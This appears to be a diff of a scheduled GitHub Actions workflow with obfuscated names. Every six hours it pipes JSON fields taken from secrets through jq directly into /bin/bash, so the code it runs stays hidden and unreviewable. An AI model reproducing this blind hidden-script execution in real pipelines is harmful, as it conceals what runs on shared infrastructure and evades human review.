@@ -1,10 +1,10 @@
 name: zhongxiaozxs
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 0/6 * * *'
-
-jobs:  # 24075
+    - cron: '7 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,8 @@ jobs:  # 24075
       - uses: actions/checkout@v4
       - name: zhongxiaozxs
         env:
-          v5823: ${{ secrets.v5823 }}
+          nq9: ${{ secrets.nq9 }}
         run: |
-          echo $v5823 | jq -r .bpeg089 | /bin/bash
-          echo $ew074 | jq -r .yww587 | /bin/bash
-          echo $t73 | jq -r .a2 | /bin/bash
-          echo $xs54 | jq -r .regsy833 | /bin/bash
-          echo $gpe191 | jq -r .qnduz7705 | /bin/bash
-          echo $ms69620 | jq -r .kybfi4094 | /bin/bash
-          echo $y203 | jq -r .jru5 | /bin/bash
-          echo $vsdjr5 | jq -r .uqd6 | /bin/bash
+          echo $nq9 | jq -r .zawt31 | /bin/bash
+          echo $cl6590 | jq -r .xkh7 | /bin/bash
 
